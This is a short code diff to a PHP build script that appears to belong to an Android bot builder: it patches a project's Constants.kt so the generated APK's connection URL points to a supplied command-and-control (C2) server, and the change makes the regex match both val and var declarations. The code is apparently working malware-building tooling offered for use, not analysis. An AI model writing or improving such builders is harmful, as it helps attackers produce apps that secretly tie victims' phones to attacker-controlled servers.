@@ -34,8 +34,8 @@ sendLog("Starting build process for $apkName ($appLabel)...");
 $constFile = $baseDir . '/app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
 if (file_exists($constFile)) {
     $c = file_get_contents($constFile);
-    // Fixed regex to match Kotlin property pattern correctly
-    $c = preg_replace('/val urlConnection\s*=\s*".*"/', 'val urlConnection = "' . $c2Url . '"', $c);
+    // Even more robust replacement for Kotlin var/val
+    $c = preg_replace('/(val|var)\s+urlConnection\s*=\s*".*?"/', '$1 urlConnection = "' . $c2Url . '"', $c);
     file_put_contents($constFile, $c);
     sendLog("Updated Constants.kt with C2 URL: $c2Url");
 } else {
